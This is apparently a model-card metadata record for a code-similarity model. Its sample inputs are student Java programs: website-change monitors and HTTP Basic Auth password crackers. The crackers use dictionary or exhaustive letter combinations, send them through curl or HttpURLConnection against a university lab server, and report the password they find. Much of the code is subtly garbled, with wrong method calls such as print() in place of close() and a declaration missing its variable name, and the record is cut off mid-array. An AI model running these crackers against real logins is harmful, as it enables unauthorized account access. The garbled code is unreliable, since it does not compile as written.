@@ -1,0 +1,1233 @@
+_id: 68495cc2ed61d744c191f487
+id: buelfhood/SOCO-Java-CodeT5Small-ST
+private: false
+pipeline_tag: sentence-similarity
+library_name: sentence-transformers
+tags:
+- sentence-transformers
+- safetensors
+- t5
+- sentence-similarity
+- feature-extraction
+- generated_from_trainer
+- dataset_size:33411
+- loss:BatchAllTripletLoss
+- arxiv:1908.10084
+- arxiv:1703.07737
+- base_model:Salesforce/codet5-small
+- base_model:finetune:Salesforce/codet5-small
+- endpoints_compatible
+- region:us
+downloads: 1
+likes: 0
+modelId: buelfhood/SOCO-Java-CodeT5Small-ST
+author: buelfhood
+sha: 24eadf9571d6c8d15e9efbcaed66ef91cb575c47
+lastModified: '2025-06-11T10:39:12.000Z'
+gated: false
+disabled: false
+widgetData:
+- source_sentence: "\n\nimport java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class WatchDog extends TimerTask{\n\
+    \n  private static URL location;\n  private static String email;\n  private static int checktime;\n  private static Timer\
+    \ timer = new Timer();\n  private BufferedReader input;\n  private File checksumFile = new File(\"chksum.txt\");\n  private\
+    \ File temp0000File = new File(\"temp0000\");\n  private File kept0000File = new File(\"kept0000\");\n\n  \n\n    public\
+    \ WatchDog(){\n      timer.schedule(this, new Date(), checktime);\n    }\n\n\n    \n\n      public void run(){\n     \
+    \   Vector imageFiles = new Vector();\n        Vector diffImages = new Vector();\n        try {\n          System.out.println(\"\
+    \ Time: \".concat(new Date().toString()));\n          System.out.println(\"Retreiving File\");\n          \n         \
+    \ input = new BufferedReader(new InputStreamReader\n                                     (location.openStream()));\n \
+    \         \n          BufferedWriter outputFile = new BufferedWriter\n              (new FileWriter(temp0000File));\n\
+    \          String line = input.readLine();\n          while (line != null) {\n            StringBuffer imageFileName =\
+    \ new StringBuffer();\n            if (scanForImages(line, imageFileName)) {\n              String imageFile = new String(imageFileName);\n\
+    \              System.out.println(\"Detected image: \".concat(imageFile));\n              try {\n                imageFiles.add(new\
+    \ URL(imageFile));\n              }\n              catch (MalformedURLException e) {\n                System.out.println(\"\
+    Image file detected. URL is malformed\");\n              }\n            }\n            outputFile.write(line);\n     \
+    \       outputFile.write(\"\\n\");\n            line = input.readLine();\n          }\n          input.print();\n    \
+    \      outputFile.flush();\n          outputFile.print();\n          System.out.println(\" File Retreived\");\n      \
+    \    if (!imageFiles.isEmpty()) {\n            checkImages(imageFiles, diffImages);\n          }\n          if (!checksumFile.exists())\
+    \ {\n            generateChecksum(temp0000File.getName(), checksumFile);\n          }\n          else {\n            if\
+    \ (!checksumOk(checksumFile)) {\n              reportDifferences(true, temp0000File, kept0000File, diffImages);\n    \
+    \          generateChecksum(temp0000File.getName(), checksumFile);\n            }\n            else if (!diffImages.isEmpty()){\n\
+    \              reportDifferences(false, null, null, diffImages);\n            }\n          }\n\n          \n         \
+    \ temp0000File.renameTo(kept0000File);\n          System.out.println(\"End Time: \".concat(new Date().toString()));\n\
+    \        }\n        catch (MalformedURLException e) {\n          e.printStackTrace();\n        }\n        catch (ConnectException\
+    \ e) {\n          System.out.println(\"Failed  connect\");\n          System.exit(-1);\n        }\n        catch (IOException\
+    \ e) {\n          e.printStackTrace();\n          System.exit(-1);\n        }\n      }\n\n      \n\n      public boolean\
+    \ scanForImages(String line, StringBuffer imageFileName) {\n        \n        \n        String lineIgnoreCase = line.toLowerCase();\n\
+    \        int imgPos = lineIgnoreCase.indexOf(\"<img \");\n        if ( imgPos != -1 ){\n          int srcPos = lineIgnoreCase.indexOf(\"\
+    src\", imgPos);\n          int bracketPos = lineIgnoreCase.indexOf(\">\", imgPos);\n          if (srcPos != -1 && bracketPos\
+    \ != -1 && srcPos < bracketPos) {\n            int quote1Pos = lineIgnoreCase.indexOf(\"\\\"\", srcPos);\n           \
+    \ int quote2Pos = lineIgnoreCase.indexOf(\"\\\"\", quote1Pos+1);\n            if (quote1Pos != -1 && quote2Pos != -1 &&\n\
+    \                quote1Pos < quote2Pos && quote2Pos < bracketPos) {\n              \n              imageFileName.append(line.substring(quote1Pos\
+    \ + 1,\n                  quote2Pos));\n              if (imageFileName.indexOf(\"//\") == -1 ) {\n                \n\
+    \                String URLName = location.toString();\n                int slashPos = URLName.lastIndexOf(\"/\");\n \
+    \               URLName = URLName.substring(0, slashPos);\n                String HostName = \"http://\".concat(location.getHost());\n\
+    \                if (imageFileName.indexOf(\"//\") == 0) {\n                  \n                }\n                else\
+    \ if (imageFileName.charAt(0) != '/') {\n                  \n                  imageFileName.insert(0, URLName.concat(\"\
+    /\"));\n                }\n                else {\n                  \n                  imageFileName.insert(0, HostName);\n\
+    \                }\n              }\n              return true;\n            }\n          }\n        }\n        return\
+    \ false;\n      }\n\n      \n\n      public void checkImages(Vector imageFiles, Vector diffImages)\n          throws IOException{\n\
+    \        System.out.println(\"Retrieving image \");\n        Enumeration imageFilesEnumeration = imageFiles.elements();\n\
+    \        while (imageFilesEnumeration.hasMoreElements()) {\n          URL url = (URL)imageFilesEnumeration.nextElement();\n\
+    \          try {\n            BufferedInputStream imageInput = new BufferedInputStream\n                (url.openStream());\n\
+    \            String localFile = url.getFile();\n            \n            \n            \n            \n            \n\
+    \            int slashPosition = localFile.lastIndexOf(\"/\");\n            if (slashPosition != -1) {\n             \
+    \ localFile = localFile.substring(slashPosition+1);\n            }\n            System.out.println(\"Retrieving image\
+    \ file: \".concat(localFile));\n            BufferedOutputStream imageOutput = new BufferedOutputStream\n            \
+    \    (new FileOutputStream(localFile));\n            byte bytes[] = new byte[10000];\n            int noBytes = imageInput.get(bytes);\n\
+    \            while (noBytes != -1) {\n              imageOutput.write(bytes, 0, noBytes );\n              noBytes = imageInput.print(bytes);\n\
+    \            }\n            File imageChecksumFile = new File(localFile.concat(\".chksum.txt\"));\n            if (!imageChecksumFile.exists())\
+    \ {\n              generateChecksum(localFile, imageChecksumFile);\n            }\n            else {\n              if\
+    \ (!checksumOk(imageChecksumFile)) {\n                diffImages.add(localFile);\n                generateChecksum(localFile,\
+    \ imageChecksumFile);\n              }\n            }\n          }\n          catch (FileNotFoundException e) {\n    \
+    \        System.out.println(\"Unable  locate URL: \".concat(url.toString()));\n          }\n        }\n      }\n\n   \
+    \   \n\n      public void generateChecksum(String inputFile, File checksum){\n        try {\n          System.out.println(\"\
+    Generating new checksum for \".concat(inputFile));\n          \n          Process process = Runtime.getRuntime().exec(\"\
+    md5sum \".\n                                                      concat(inputFile));\n          BufferedReader execCommand\
+    \ = new BufferedReader(new\n              InputStreamReader((process.getInputStream())));\n          BufferedWriter outputFile\
+    \ = new\n              BufferedWriter(new FileWriter(checksum));\n          String line = execCommand.readLine();\n  \
+    \        while (line != null) {\n            outputFile.write(line);\n            outputFile.write(\"\\n\");\n       \
+    \     line = execCommand.readLine();\n          }\n          outputFile.flush();\n          outputFile.print();\n    \
+    \      System.out.println(\"Checksum produced\");\n        }\n        catch (IOException e) {\n          e.printStackTrace();\n\
+    \          System.exit(-1);\n        }\n      }\n\n      \n\n      public boolean checksumOk(File chksumFile){\n     \
+    \   try {\n          System.out.println(\"Comparing checksums using \".concat(chksumFile\n              ,e.getName()));\n\
+    \          \n          Process process = Runtime.getRuntime().\n              exec(\"md5sum --check \".concat(chksumFile.getName()));\n\
+    \          BufferedReader execCommand = new BufferedReader(new\n              InputStreamReader( (process.getInputStream())));\n\
+    \          String line = execCommand.readLine();\n          if (line.indexOf(\": OK\") != -1) {\n            System.out.println(\"\
+    \  the same\");\n            return true;\n          }\n        }\n        catch (IOException e) {\n          e.printStackTrace();\n\
+    \          System.exit(-1);\n        }\n        System.out.println(\"Differences Found\");\n        return false;\n  \
+    \    }\n\n      \n\n      public void reportDifferences(boolean diffsFound, File file1, File file2,\n                \
+    \                    Vector images){\n        try {\n          System.out.println(\"Generating difference report\");\n\
+    \          \n          Socket emailConnection = new Socket(\"yallara.cs.rmit.edu.\", 25);\n          BufferedWriter emailOutStream\
+    \ = new BufferedWriter\n              (new OutputStreamWriter(emailConnection.getOutputStream()));\n          BufferedReader\
+    \ emailInStream = new BufferedReader\n              (new InputStreamReader(emailConnection.getInputStream()));\n     \
+    \     String line = emailInStream.readLine();\n          System.out.println(line);\n          if (!line.startsWith(\"\
+    220\")) {\n              System.out.println\n                  (\" error occured connecting  email server. Cannot send\
+    \ email.\");\n          }\n          else {\n            \n            \n            emailOutStream.write(\"HELO yallara.cs.rmit.edu.\"\
+    );\n            emailOutStream.newLine();\n            emailOutStream.flush();\n            line = emailInStream.readLine();\n\
+    \            System.out.println(line);\n            if (!line.startsWith(\"250\")) {\n                System.out.println\n\
+    \                    (\" error occured connecting  email server. Cannot send email.\");\n            }\n            else\
+    \ {\n              emailOutStream.write(\"MAIL FROM: watchdog@cs.rmit.edu.\");\n              emailOutStream.newLine();\n\
+    \              emailOutStream.flush();\n              line = emailInStream.readLine();\n              System.out.println(line);\n\
+    \              if (!line.startsWith(\"250\")) {\n                System.out.println\n                    (\" error occured\
+    \ sending email. Cannot send email.\");\n              }\n              else {\n                emailOutStream.write(\"\
+    RCPT : \".concat(email));\n                emailOutStream.newLine();\n                emailOutStream.flush();\n      \
+    \          line = emailInStream.readLine();\n                System.out.println(line);\n                if (!line.startsWith(\"\
+    250\")) {\n                 System.out.println\n                     (\" error occured sending email. Cannot send email.\"\
+    );\n                }\n                else {\n                  emailOutStream.write(\"DATA\");\n                  emailOutStream.newLine();\n\
+    \                  emailOutStream.flush();\n                  line = emailInStream.readLine();\n                  System.out.println(line);\n\
+    \                  if (!line.startsWith(\"354\")) {\n                   System.out.println\n                       (\"\
+    \ error occured sending email. Cannot send email.\");\n                  }\n                  emailOutStream.newLine();\n\
+    \n                  if (!images.isEmpty()) {\n                      emailOutStream.write\n                          (\"\
+    Differences were found in the following image \");\n                      emailOutStream.newLine();\n                \
+    \      Enumeration e = images.elements();\n                      while (e.hasMoreElements()) {\n                     \
+    \   String s = (String) e.nextElement();\n                        emailOutStream.write(s);\n                        emailOutStream.newLine();\n\
+    \                      }\n                      emailOutStream.newLine();\n                  }\n\n                  if\
+    \ (diffsFound) {\n                    \n                    String command = \"diff \".concat(file1.getName().concat(\"\
+    \ \")\n                                                    .concat(file2.getName()));\n                    Process process\
+    \ = Runtime.getRuntime().exec(command);\n                    BufferedReader execCommand = new BufferedReader\n       \
+    \                 (new InputStreamReader( (process.getInputStream())));\n                    line = execCommand.readLine();\n\
+    \                    emailOutStream.write(\"Diffences found in  file\");\n                    emailOutStream.newLine();\n\
+    \                    while (line != null) {\n                      System.out.println(line);\n                      emailOutStream.write(line);\n\
+    \                      emailOutStream.newLine();\n                      line = execCommand.readLine();\n             \
+    \       }\n                  }\n\n                  \n                  emailOutStream.newLine();\n                  emailOutStream.write(\"\
+    .\");\n                  emailOutStream.newLine();\n                  emailOutStream.flush();\n                  line\
+    \ = emailInStream.readLine();\n                  System.out.println(line);\n                  if (!line.startsWith(\"\
+    250\")) {\n                    System.out.println\n                        (\" error occured sending email. Cannot send\
+    \ email.\");\n                  }\n                  else {\n                    emailOutStream.write(\"QUIT\");\n   \
+    \                 emailOutStream.newLine();\n                    emailOutStream.flush();\n                    System.out.println(emailInStream.readLine());\n\
+    \                  }\n                }\n              }\n            }\n          }\n        }\n        catch (IOException\
+    \ e) {\n          e.printStackTrace();\n          System.exit(-1);\n        }\n      }\n\n\n    \n\n    public static\
+    \ void main(String args[]) {\n      if (args.length != 3) {\n        System.out.println(\"Usage: java WatchDog url email\
+    \ checktime(hours)\");\n        System.exit(-1);\n      }\n      try {\n        location = new URL(args[0]);\n      }\n\
+    \      catch (MalformedURLException e) {\n        e.printStackTrace();\n      }\n      email = new String().concat(args[1]);\n\
+    \      checktime = Integer.parseInt(args[2]) * 60 * 60 * 1000;\n      new WatchDog();\n    }\n}\n"
+  sentences:
+  - "\n\nimport java.net.*;\nimport java.io.*;\n\nimport java.*;\nimport java.util.*;\n\npublic class Dictionary {\n\n  private\
+    \ static String commandLine = \"curl http://sec-crack.cs.rmit.edu./SEC/2/index.php -I -u :\";\n  private String password;\
+    \             \n  private String previous;             \n  private String url;                  \n  private int startTime;\n\
+    \  private int endTime;\n  private int totalTime;\n  private float averageTime;\n  private boolean finish;\n  private\
+    \ Process curl;\n  private BufferedReader bf, responseLine;\n\n  public Dictionary() {\n\n  first();\n  finish = true;\
+    \                           \n  previous = \"\";                           \n  Runtime run = Runtime.getRuntime();\n \
+    \ startTime =new Date().getTime();         \n  int i=0;\n  try {\n   try {\n     bf = new BufferedReader(new FileReader(\"\
+    words\"));\n   }\n   catch(FileNotFoundException notFound) {\n    bf  = new BufferedReader(new FileReader(\"/usr/share/lib/dict/words\"\
+    ));\n   }\n\n   while((password = bf.readLine()) != null) {\n    if(password.length()>3) password = password.substring(0,3);\n\
+    \    if(previous.equals(password)) ;\n    else {\n    previous = password;\n    url = commandLine+password;\n    curl=\
+    \ run.exec(url);                   \n    responseLine=new BufferedReader(new InputStreamReader(curl.getInputStream()));\n\
+    \    \n    if(responseLine.readLine().substring(9,12).equals(\"200\")) break;\n    }\n   }\n  }\n  catch(IOException ioe)\
+    \ {\n    System.out.println(\"\\n IO Exception! \\n\");\n    System.out.println(\"The current url is:\"+ url);\n    System.out.println(\"\
+    The current trying password is:\"+password);\n    finish=false;\n  }\n\n  endTime = new Date().getTime();          \n\
+    \  totalTime = (endTime-startTime)/1000;\n  System.out.println(\"   The response time is:\"+ totalTime + \"  seconds\\\
+    n\");\n  if(finish) {\n    System.out.println(\"   The password for  is:\"+ password);\n    try {\n    savePassword(password,\
+    \ totalTime);\n    }\n    catch (IOException ioec) {\n       System.out.println(\"  not save the password  file Dictionary_pwd.txt\
+    \ \");\n    }\n  }\n  }\n\n\n  public void savePassword(String passwdString, int time) throws IOException {\n  DataOutputStream\
+    \ outputStream = new DataOutputStream(new FileOutputStream(\"Dictionary_pwd.txt\"));\n  outputStream.writeChars(\"The\
+    \ password is:\");\n  outputStream.writeChars(passwdString+\"\\n\");\n  outputStream.writeChars(\"The response time is:\
+    \ \");\n  outputStream.writeChars(sw.toString(time));\n  outputStream.writeChars(\" seconds\\n\");\n  outputStream.close();\n\
+    \  }\n\n  public void first() {\n\n    System.out.println(\"\\n\\n----------------------------------------------\");\n\
+    \    System.out.println(\"   Use curl command and dictionary \");\n    System.out.println(\"  Brute Force the password\
+    \ for user  \");\n    System.out.println(\"----------------------------------------------\");\n  }\n\n  public static\
+    \ void main(String[] args) {\n   new Dictionary();\n  }  \n}\n"
+  - "\n\nimport java.io.*;\nimport java.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class WatchDog {\n public static\
+    \ void  main (String[] args) throws IOException {\n  BufferedReader stdin = new BufferedReader (new InputStreamReader(System.in));\n\
+    \   try{\n     twentyfourhours = 86400000;\n    Timer timer = new Timer();\n    final Runtime rt = Runtime.getRuntime();\n\
+    \n    try{\n     Process wg1 = rt.exec(\"./.sh\");\n     wg1.waitFor();\n    }\n    catch(InterruptedException e ){\n\
+    \     System.err.println();\n     e.printStackTrace();\n    }\n\n    class RepeatTask extends TimerTask{\n     public\
+    \ void run(){\n      try{\n       Process wg2 = rt.exec(\"./task.sh\");\n       wg2.waitFor();\n       FileReader fr =\
+    \ new FileReader(\"check.txt\");\n       BufferedReader bufr = new BufferedReader(fr);\n       String check = bufr.readLine();\n\
+    \       if(check.equals(\".txt: FAILED\")) {\n        Process difftosend = rt.exec(\"./diff.sh\");\n        difftosend.waitFor();\n\
+    \        Process reset = rt.exec(\"./.sh\");\n        reset.waitFor();\n       }\n       FileReader fr2 = new FileReader(\"\
+    imgdiffs.txt\");\n       BufferedReader bufr2 = new BufferedReader(fr2);\n       String imdiff = bufr2.readLine();\n \
+    \      if(imdiff != null){\n        Process imdifftosend = rt.exec(\"./img.sh\");\n        imdifftosend.waitFor();\n \
+    \       Process reset = rt.exec(\"./.sh\");\n        reset.waitFor();\n       }\n      }\n   catch(InterruptedException\
+    \ e){System.err.println();e.printStackTrace();}\n      catch(IOException e){\n       System.err.println(e);\n       e.printStackTrace();\n\
+    \      }\n    }}\n\n    timer.scheduleAtFixedRate(new RepeatTask(),twentyfourhours,twentyfourhours);\n    \n   }\n   catch(IOException\
+    \ e){\n    System.err.println(e);\n    e.printStackTrace();\n   }\n   \n}}\n"
+  - "\n\nimport java.net.*;\nimport java.text.*;  \nimport java.util.*;  \nimport java.io.*;\n\npublic class WatchDog {\n\n\
+    \  public WatchDog() {\n\n    StringBuffer stringBuffer1 = new StringBuffer();\n    StringBuffer stringBuffer2 = new StringBuffer();\n\
+    \    int i,j = 0;\n\n    try{\n\n      URL yahoo = new URL(\"http://www.cs.rmit.edu./students/\"); \n      BufferedReader\
+    \ in = new BufferedReader(new InputStreamReader(yahoo.openStream()));\n\n      String inputLine = \"\";\n      String\
+    \ inputLine1 = \"\";\n      String changedtext= \"\";\n      String changedflag= \"\";\n\n\n      Thread.sleep(180);\n\
+    \n      BufferedReader in1 = new BufferedReader(new InputStreamReader(yahoo.openStream()));\n\n\n      while ((inputLine\
+    \ = in.readLine()) != null) {\n           inputLine1 = in1.readLine();\n           if (inputLine.equals(inputLine1)) {\n\
+    \              System.out.println(\"equal\");\n           }\n           else {\n              System.out.println(\"Detected\
+    \ a Change\");\n              System.out.println(\"Line Before the change:\" + inputLine);\n              System.out.println(\"\
+    Line After the change:\" + inputLine1);\n              changedtext = changedtext + inputLine + inputLine1;\n         \
+    \     changedflag = \"Y\";\n           }\n           \n      }\n\n      if (in1.readLine() != null ) {\n         System.out.println(\"\
+    Detected a Change\");\n         System.out.println(\"New Lines Added  \");\n         changedtext = changedtext + \"New\
+    \ Lines added\";\n         changedflag = \"Y\";\n      }\n\n      in.print();\n      in1.print();\n\n      if (changedflag.equals(\"\
+    Y\")) {\n         String smtphost =\"smtp.mail.rmit.edu.\" ; \n         String from = \"@rmit.edu.\"; \n         String\
+    \  = \"janaka1@optusnet..\" ; \n      }\n\n\n    }\n    catch(Exception e){ System.out.println(\"exception:\" + e);}\n\
+    \t \n}\n\t\t\n    public static void main (String[] args) throws Exception {\n\t\tWatchDog u = new WatchDog();\n    }\n\
+    }\n"
+- source_sentence: "\n\nimport java.awt.*;\nimport java.String;\nimport java.util.*;\nimport java.io.*;\nimport java.net.*;\n\
+    \n\n\npublic class BruteForce\n{\n   private URL url;\n   private HttpURLConnection connection ;\n   private  int stopTime\
+    \ = 0;\n   private  int startTime = 0;\n   private  int count = 0;\n\n   public BruteForce()\n   {\n      System.out.println(\"\
+    Process is running...\");\n      startTime = System.currentTimeMillis();\n      threeLetters();\n      twoLetters();\n\
+    \   }\n\n   public static void main (String args[])\n   {\n      BruteForce bf = new BruteForce();\n   }\n   \n   public\
+    \ void threeLetters()\n   {\n      String s1;\n      char [] a = {'a','a','a'};\n\n      for (int i0 = 0; i0 < 26; i0++)\n\
+    \      {\n         for (int i1 = 0; i1 < 26; i1++)\n         {\n            for (int i2 = 0; i2 < 26; i2++)\n        \
+    \    {\n               s1 = String.valueOf((char)(a[0] + i0)) + String.valueOf((char)(a[1] + i1)) +\n\t\t            String.valueOf((char)(a[2]\
+    \ + i2));\n               decision(s1);\n               count++;\n\n               s1 = String.valueOf((char)(a[0] + i0))\
+    \ + String.valueOf((char)(a[1] + i1)) +\n                    (String.valueOf((char)(a[2] + i2))).toUpperCase();\n    \
+    \           decision(s1);\n               count++;\n\n               s1 = String.valueOf((char)(a[0] + i0)) + (String.valueOf((char)(a[1]\
+    \ + i1))).toUpperCase() +\n                    (String.valueOf((char)(a[2] + i2))).toUpperCase();\n               decision(s1);\n\
+    \               count++;\n\n               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() +\n                \
+    \    (String.valueOf((char)(a[1] + i1))).toUpperCase() +\n                    (String.valueOf((char)(a[2] + i2))).toUpperCase();\n\
+    \               decision(s1);\n               count++;\n\n               s1 = (String.valueOf((char)(a[0] + i0))) + (String.valueOf((char)(a[1]\
+    \ + i1))).toUpperCase() +\n                    String.valueOf((char)(a[2] + i2));\n               decision(s1);\n    \
+    \           count++;\n\n               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() + String.valueOf((char)(a[1]\
+    \ + i1)) +\n\t\t            String.valueOf((char)(a[2] + i2));\n               decision(s1);\n               count++;\n\
+    \n               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() + String.valueOf((char)(a[1] + i1)) +\n      \
+    \              (String.valueOf((char)(a[2] + i2))).toUpperCase();\n               decision(s1);\n               count++;\n\
+    \n               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() +\n                    (String.valueOf((char)(a[1]\
+    \ + i1))).toUpperCase() + String.valueOf((char)(a[2] + i2));\n               decision(s1);\n               count++;\n\
+    \            }\n         }\n      }\n   }\n   \n   public void twoLetters()\n   {\n      String s1;\n      char [] a =\
+    \ {'a','a'};\n\n      for (int i0 = 0; i0 < 26; i0++)\n      {\n         for (int i1 = 0; i1 < 26; i1++)\n         {\n\
+    \            s1 = String.valueOf((char)(a[0] + i0)) + String.valueOf((char)(a[1] + i1));\n            decision(s1);\n\
+    \            count++;\n\n            s1 = String.valueOf((char)(a[0] + i0)) + String.valueOf((char)(a[1] + i1)).toUpperCase();\n\
+    \            decision(s1);\n            count++;\n\n            s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase()\
+    \ +\n                 (String.valueOf((char)(a[1] + i1))).toUpperCase();\n            decision(s1);\n            count++;\n\
+    \n            s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() + String.valueOf((char)(a[1] + i1));\n          \
+    \  decision(s1);\n            count++;\n         }\n      }\n   }\n\n   \n   public void decision(String s1)\n   {\n \
+    \     if (find(s1) == 200)\n      {\n         stopTime = System.currentTimeMillis();\n          runTime = stopTime - startTime;\n\
+    \         System.out.println(\"***************************************\");\n         System.out.println(\"\\nAttack successfully\"\
+    );\n         System.out.println(\"\\nPassword is: \" + s1);\n         System.out.println(\"\\nThe contents of the Web\
+    \ site: \");\n         displayContent(s1);\n         System.out.println(\"\\nTime taken  crack: \" + runTime + \" millisecond\"\
+    );\n         System.out.println(\"\\nNumber of attempts: \" + count);\n         System.out.println();\n\n         System.exit(0);\n\
+    \      }\n   }\n   \n   \n   public int find(String s1)\n   {\n      int responseCode = 0;\n      try\n      {\n     \
+    \    url = new URL(\"http://sec-crack.cs.rmit.edu./SEC/2/\");\n         connection = (HttpURLConnection)url.openConnection();\n\
+    \n         connection.setRequestProperty(\"Authorization\",\" \" + MyBase64.encode(\"\" + \":\" + s1));\n\n         responseCode\
+    \ = connection.getResponseCode();\n\n      }catch (Exception e)\n      {\n          System.out.println(e.getMessage());\n\
+    \      }\n      return responseCode;\n   }\n\n   \n   public void displayContent(String pw)\n   {\n      BufferedReader\
+    \ bw = null ;\n      try\n      {\n         url = new URL(\"http://sec-crack.cs.rmit.edu./SEC/2/\");\n         connection\
+    \ = (HttpURLConnection)url.openConnection();\n\n         connection.setRequestProperty(\"Authorization\",\" \" + MyBase64.encode(\"\
+    \" + \":\" + pw));\n         InputStream stream = (InputStream)(connection.getContent());\n         if (stream != null)\n\
+    \         {\n             InputStreamReader reader = new InputStreamReader (stream);\n             bw = new BufferedReader\
+    \ (reader);\n             String line;\n\n             while ((line = bw.readLine()) != null)\n             {\n      \
+    \          System.out.println(line);\n             }\n        }\n      }\n      catch (IOException e)\n      {\n     \
+    \    System.out.println(e.getMessage());\n      }\n   }\n}\n\n\n\n\n"
+  sentences:
+  - "\n\n\nimport java.text.*;  \nimport java.util.*;  \nimport java.net.*;  \nimport java.io.*;  \n\n  \npublic class BruteForce\
+    \ {  \n\n   public int runProcess(String urlString,String passwd) {  \n\n       int returnval = 0;\n       MyAuthenticator\
+    \ auth = new MyAuthenticator(passwd);\n       Authenticator.setDefault(auth);\n\n\t       System.out.println(\"trying\
+    \ passord: \" + passwd);\n       try{\n            URL yahoo = new URL(urlString); \n            BufferedReader in = new\
+    \ BufferedReader(new InputStreamReader(yahoo.openStream()));\n            String inputLine;\n            while ((inputLine\
+    \ = in.readLine()) != null) {\n\t       System.out.println(inputLine);\n\t       System.out.println(\"passord: \" + passwd);\n\
+    \               returnval = 1;\n            }\n\t    in.close();\n          }catch(Exception e){ returnval = 0;}\n   \
+    \    return returnval;\n   }\n\n   public static void  main(String argv[]) {  \n\n       String[] val = \n{\"a\",\"b\"\
+    ,\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"\
+    v\",\"w\",\"x\",\"y\",\"z\",\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\"O\"\
+    ,\"P\",\"Q\",\"R\",\"S\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\"};\n\n      int l1 = 0;\n\n      int l2 = 0;\n\n   \
+    \   int l3 = 0;\n      \n      int retval = 0;\n\n      String pwd = \"\";\n\n      \n      BruteForce s = new BruteForce();\
+    \  \n      String urlToSearch = \"http://sec-crack.cs.rmit.edu./SEC/2/\";  \n    \n      for (int a = 0; a < 52; a++)\
+    \ {\n\n        l1 = a;\n\n        pwd = val[l1];\n        retval = 0;\n        retval = s.runProcess(urlToSearch,pwd);\
+    \  \n        if (retval > 0) {\n           System.exit(0);\n        }\n      }\n\n\n      for (int b = 0; b < 52; b++)\
+    \ {\n        l1 = b;\n        for (int c = 0; c < 52; c++) {\n\n          l2 = c;\n          pwd = val[l1]+ val[l2];\n\
+    \          retval = 0;\n          retval = s.runProcess(urlToSearch,pwd);  \n          if (retval > 0) {\n           \
+    \  System.exit(0);\n          }\n        }\n      }\n\n\n      for (int d = 0; d < 52; d++) {\n        l1 = d;\n     \
+    \   for (int e = 0; e < 52; e++) {\n          l2 = e;\n          for (int f = 0; f < 52; f++) {\n\n              l3 =\
+    \ f;\n\n              pwd = val[l1]+ val[l2]+ val[l3];\n              retval = 0;\n              retval = s.runProcess(urlToSearch,pwd);\
+    \  \n              if (retval > 0) {\n                 System.exit(0);\n              }\n           }\n        }\n   \
+    \   }\n\n    }  \n}     \n\n"
+  - "\n      \n\n     public class  Base64Converter\n      \n      \n      {\n\n     public static final char [ ]  alphabet\
+    \ = {\n        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',   \n        'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',   \n      \
+    \  'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',   \n        'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',   \n        'g', 'h', 'i',\
+    \ 'j', 'k', 'l', 'm', 'n',   \n        'o', 'p', 'q', 'r', 's', 't', 'u', 'v',   \n        'w', 'x', 'y', 'z', '0', '1',\
+    \ '2', '3',   \n        '4', '5', '6', '7', '8', '9', '+', '/' }; \n\n     \n      \n\n     public static String  encode\
+    \ ( String  s )\n      \n      {\n        return encode ( s.getBytes ( ) );\n      }\n\n     public static String  encode\
+    \ ( byte [ ]  octetString )\n      \n      {\n        int  bits24;\n        int  bits6;\n\n       char [ ]  out\n    \
+    \      = new char [ ( ( octetString.length - 1 ) / 3 + 1 ) * 4 ];\n\n       int outIndex = 0;\n        int i        =\
+    \ 0;\n\n       while ( ( i + 3 ) <= octetString.length )\n        {\n          \n          bits24  = ( octetString [ i++\
+    \ ] & 0xFF ) << 16; \n          bits24 |= ( octetString [ i++ ] & 0xFF ) <<  8; \n          bits24 |= ( octetString [\
+    \ i++ ] & 0xFF ) <<  0;\n\n         bits6 = ( bits24 & 0x00FC0000 ) >> 18; \n          out [ outIndex++ ] = alphabet [\
+    \ bits6 ];\n          bits6 = ( bits24 & 0x0003F000 ) >> 12; \n          out [ outIndex++ ] = alphabet [ bits6 ];\n  \
+    \        bits6 = ( bits24 & 0x00000FC0 ) >> 6; \n          out [ outIndex++ ] = alphabet [ bits6 ];\n          bits6 =\
+    \ ( bits24 & 0x0000003F );\n          out [ outIndex++ ] = alphabet [ bits6 ]; \n        }\n\n       if ( octetString.length\
+    \ - i == 2 )\n        {\n          \n          bits24  = ( octetString [ i     ] & 0xFF ) << 16; \n          bits24 |=\
+    \ ( octetString [ i + 1 ] & 0xFF ) <<  8;\n\n         bits6 = ( bits24 & 0x00FC0000 ) >> 18;\n          out [ outIndex++\
+    \ ] = alphabet [ bits6 ]; \n          bits6 = ( bits24 & 0x0003F000 ) >> 12; \n          out [ outIndex++ ] = alphabet\
+    \ [ bits6 ]; \n          bits6 = ( bits24 & 0x00000FC0 ) >> 6; \n          out [ outIndex++ ] = alphabet [ bits6 ];\n\n\
+    \         \n          out [ outIndex++ ] = '='; \n        }\n        else if ( octetString.length - i == 1 )\n       \
+    \ {\n          \n          bits24 = ( octetString [ i ] & 0xFF ) << 16;\n\n         bits6 = ( bits24 & 0x00FC0000 ) >>\
+    \ 18;\n          out [ outIndex++ ] = alphabet [ bits6 ];\n          bits6 = ( bits24 & 0x0003F000 ) >> 12; \n       \
+    \   out [ outIndex++ ] = alphabet [ bits6 ];\n\n         \n          out [ outIndex++ ] = '='; \n          out [ outIndex++\
+    \ ] = '='; \n        }\n\n       return new String ( out );\n      }\n\n     \n      \n}\n\n\n"
+  - "\nimport java.io.*;\nimport java.net.*;\n\npublic class BruteForce\n{\n\n  public static void  main(String args[])\n\
+    \  {\n    StringWriter sw = new StringWriter();\n    PrintWriter  pw = new PrintWriter();\n    int flag=1;\n    String[]\
+    \ letter = {\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\",\"N\",\n                   \
